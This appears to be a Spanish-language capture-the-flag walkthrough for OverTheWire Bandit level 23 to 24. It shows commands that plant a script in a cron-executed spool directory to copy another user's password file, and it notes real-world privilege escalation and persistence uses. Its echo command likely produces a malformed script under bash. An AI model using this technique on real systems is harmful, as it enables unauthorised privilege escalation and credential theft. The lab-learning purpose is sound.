# OverTheWire - Bandit: Nivel 23 → 24 - Escalada via cron y directorio escribible

## Comando(s)

```bash
cat /usr/bin/cronjob_bandit24.sh
```
```bash
echo '#!/bin/bash\ncat /etc/bandit_pass/bandit24 > /tmp/pass_bandit24.txt' > /var/spool/bandit24/foo/exploit.sh
```
```bash
chmod +x /var/spool/bandit24/foo/exploit.sh
```
```bash
cat /tmp/pass_bandit24.txt
```

## Concepto

Un cron job corre como `bandit24`, entra a `/var/spool/bandit24/foo/` y ejecuta todos los archivos regulares propiedad de `bandit23`. Como `bandit23` puede escribir en ese directorio, crea un script que lee `/etc/bandit_pass/bandit24` (solo legible por `bandit24`) y lo escribe a `/tmp/pass_bandit24.txt`. El cron ejecuta el script con privilegios de `bandit24` y genera el archivo legible.

## Aplicación real

- **Privilege escalation**: procesos privilegiados que ejecutan scripts en directorios escritos por usuarios de bajo privilegio.
- **Persistencia**: dejar scripts maliciosos en spools o colas de procesamiento.
- **Auditoría**: revisar permisos de `/var/spool/*` y scripts ejecutados por cron como root o usuarios privilegiados.

## Errores comunes

- No dar permisos de ejecución al script (`chmod +x`).
- Escribir en el directorio equivocado.
- No esperar el minuto que tarda el cron en ejecutar.
- Crear un script que tarde más de 60 segundos (el cron lo mata con `timeout -s 9`).

## Variantes útiles

- `find / -writable 2>/dev/null` encuentra directorios escritos por el usuario actual.
- `ls -ld /var/spool/*` revisa permisos de spools.
- `crontab -u bandit24 -l` (si se tuviera permiso) para ver jobs de otro usuario.
- `inotifywait` para detectar cuándo se ejecuta un archivo.
- Técnicas de **symlink/race condition** si el script no valida bien el archivo.
